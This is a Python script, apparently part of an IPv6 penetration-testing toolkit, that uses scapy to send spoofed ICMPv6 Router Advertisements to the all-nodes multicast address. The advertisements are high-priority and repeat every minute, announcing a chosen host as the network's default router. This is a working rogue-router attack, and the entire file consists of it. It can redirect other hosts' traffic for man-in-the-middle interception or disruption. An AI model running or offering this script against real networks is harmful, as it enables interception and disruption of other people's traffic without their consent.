#!/usr/bin/python
from scapy.layers.inet6 import IPv6, ICMPv6ND_RA, ICMPv6NDOptPrefixInfo, ICMPv6NDOptSrcLLAddr, getmacbyip6
from scapy.sendrecv import send


def defaultRouter_RA(interface, smac, sip, router_lifetime):
    if smac == "":
        smac = getmacbyip6(sip)
    if router_lifetime == "":
        router_lifetime = 1800
    router_lifetime = int(router_lifetime)
    # Generate packets
    layer3 = IPv6(src=sip, dst="ff02::1")
    packet1 = layer3 / ICMPv6ND_RA(prf="High", routerlifetime=router_lifetime) / \
              ICMPv6NDOptPrefixInfo(prefixlen=64, validlifetime=0x6,
                                    preferredlifetime=0x6, prefix="fe80::") / \
              ICMPv6NDOptSrcLLAddr(lladdr=smac)

    print("Periodical informing to the network that host " + sip + " is the default router (press Ctrl C to stop the "
                                                                   "program)")
    if interface == "":
        send(packet1, count=10000, inter=60, verbose=False)
    else:
        send(packet1, count=10000, inter=60, verbose=False, iface=interface)
